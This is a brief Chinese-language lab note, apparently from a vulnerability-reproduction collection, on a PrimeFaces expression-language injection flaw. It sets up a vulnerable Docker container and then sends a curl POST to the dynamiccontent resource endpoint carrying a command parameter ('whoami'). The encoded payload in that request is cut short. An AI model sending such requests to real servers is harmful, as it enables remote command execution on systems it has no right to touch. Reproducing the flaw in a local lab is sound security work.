环境搭建
```
docker build -t primefaces-el-injection .
docker run -d -p 9090:8080 primefaces-el-injection
```

![](./img/9cae7574ad2c46a99daca7107dde08f4.png)


漏洞复现
```
curl -X POST "http://127.0.0.1:9090/primefaces/javax.faces.resource/dynamiccontent.properties.xhtml" -d "pfdrt=sc&ln=primefaces&pfdrid=uMKljP...&cmd=whoami"
```

![](./img/6d47b1748fd2442fb9a59665998cbf0d.png)
